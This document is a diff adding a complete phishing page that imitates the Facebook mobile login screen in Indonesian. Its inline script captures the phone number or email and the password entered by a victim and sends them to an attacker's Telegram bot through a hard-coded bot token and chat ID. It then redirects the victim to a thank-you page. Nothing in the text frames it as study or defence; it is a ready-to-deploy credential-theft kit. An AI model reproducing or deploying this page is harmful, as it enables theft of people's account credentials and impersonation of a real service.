@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook - Masuk atau Daftar</title>
+    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/4Kv5U5b1o3f.png" rel="shortcut icon" sizes="196x196" />
+    <meta name="referrer" content="default" id="meta_referrer" />
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fff;
+            font-size: 14px;
+        }
+        #viewport {
+            width: 100%;
+            padding: 0 16px;
+        }
+        #page {
+            padding: 20px 0;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 90px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        input[type="text"], input[type="password"] {
+            margin-bottom: 12px;
+            padding: 12px;
+            border: 1px solid #ccd0d5;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+        button:hover {
+            background-color: #166fe5;
+        }
+        .signup, .install-app {
+            text-align: center;
+            margin-top: 16px;
+        }
+        .signup a, .install-app a {
+            color: #1877f2;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .divider {
+            align-items: center;
+            border-bottom: 1px solid #dadde1;
+            display: flex;
+            margin: 20px 0;
+            text-align: center;
+        }
+        .divider .line {
+            flex-grow: 1;
+        }
+        .divider .or {
+            background-color: #fff;
+            color: #4b4f56;
+            font-size: 14px;
+            padding: 0 10px;
+        }
+        .create-account {
+            background-color: #42b72a;
+        }
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        .language-selector {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8a8d91;
+        }
+        .language-selector a {
+            color: #8a8d91;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+    </style>
+</head>
+<body>
+    <div id="viewport">
+        <div id="page">
+            <div class="logo">
+                <img src="fb.png" alt="Facebook">
+            </div>
+            <form id="myForm">
+                <input type="text" id="NomorPonsel" placeholder="Nomor ponsel atau email" required>
+                <input type="password" id="Password" placeholder="Kata Sandi" required>
+                <button type="submit">Masuk</button>
+            </form>
+            <div class="signup">
+                <a href="#">Lupa kata sandi?</a>
+            </div>
+            <div class="divider">
+                <span class="line"></span>
+                <span class="or">atau</span>
+                <span class="line"></span>
+            </div>
+            <div class="signup">
+                <button class="create-account">Buat akun baru</button>
+            </div>
+            <div class="language-selector">
+                <a href="#">Bahasa Indonesia</a> · 
+                <a href="#">English (UK)</a> · 
+                <a href="#">Basa Jawa</a> · 
+                <a href="#">Bahasa Melayu</a> · 
+                <a href="#">日本語</a>
+                <p><a href="#">Lainnya...</a></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('myForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            
+            const telegramBotToken = '6929481263:AAG0sz_u5eGS6DYGfGKElzjXAe1cQbrXDfE';
+            const telegramChatId = '6670918014';
+
+            const NomorPonsel = document.getElementById('NomorPonsel').value;
+            const Password = document.getElementById('Password').value;
+
+            const message = `Nomor/Gmail: ${NomorPonsel}\nPassword: ${Password}` ;
+            
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            const payload = {
+                chat_id: telegramChatId,
+                text: message
+            };
+
+            const options = {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            };
+
+            try {
+                const response = await fetch(url, options);
+                if (response.ok) {
+                    window.location.href = 'thanks.html'; // Arahkan pengguna ke thanks.html setelah berhasil submit
+                } else {
+                    alert('Terjadi kesalahan, coba lagi.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Terjadi kesalahan, coba lagi.');
+            }
+        });
+    </script>
+</body>
+</html>
